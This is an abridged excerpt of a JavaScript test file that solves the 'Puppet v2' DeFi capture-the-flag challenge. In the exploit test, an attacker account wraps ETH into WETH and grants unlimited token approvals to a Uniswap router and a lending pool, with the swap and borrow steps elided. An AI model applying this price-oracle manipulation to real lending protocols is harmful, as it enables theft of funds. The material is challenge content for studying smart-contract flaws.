...
describe('[Challenge] Puppet v2', function () {
  ...
  it('Exploit', async function () {
    ...
    // convert ETH to WETH
    await this.weth.connect(attacker).deposit({ value: ethers.utils.parseEther('19.7') });

    // Swap all tokens to WETH
    await this.token.connect(attacker).approve(this.uniswapRouter.address, '0xfffffffffffffffffff');
    ...
    // Borrow with WETH
    await this.weth.connect(attacker).approve(this.lendingPool.address, '0xfffffffffffffffffff');
